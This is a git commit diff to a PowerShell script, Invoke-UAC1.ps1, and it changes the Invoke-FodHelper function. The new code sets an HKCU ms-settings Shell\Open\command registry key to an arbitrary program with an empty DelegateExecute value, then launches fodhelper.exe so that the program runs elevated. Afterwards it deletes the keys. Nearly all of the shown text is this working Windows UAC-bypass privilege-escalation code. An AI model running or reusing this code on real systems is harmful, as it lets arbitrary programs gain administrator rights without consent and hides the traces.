ab94950513c6e49bd6c0df31dfd1288fa5dce6ff
smgorelik <smgorelik@gmail.com>
2023-03-23 00:16:49 -0400

    Update Invoke-UAC1.ps1

--- Invoke-UAC1.ps1
+++ Invoke-UAC1.ps1
@@ -29,16 +29,13 @@ function Invoke-FodHelper {
     Process {
 		if( $isAdmin )
 		{
-			New-Item "HKCU:\Software\Classes\ms-settings\CurVer" -Force
-			Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".bla" -Force
-			New-Item "HKCU:\Software\Classes\.bla\Shell\Open\command" -Force
-			New-ItemProperty -Path "HKCU:\Software\Classes\.bla\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-			Set-ItemProperty -Path "HKCU:\Software\Classes\.bla\Shell\Open\command" -Name "(default)" -Value $program -Force
+			New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+			New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+			Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
 			Start-Sleep -s 1
 			Start-Process "C:\Windows\System32\fodhelper.exe"
 			Start-Sleep -s 1
-			Remove-Item "HKCU:\Software\Classes\ms-settings\CurVer" -Recurse -Force
-			Remove-Item "HKCU:\Software\Classes\.bla\" -Recurse -Force
+			Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 		}else
 		{
 			Add-Type -AssemblyName PresentationFramework;
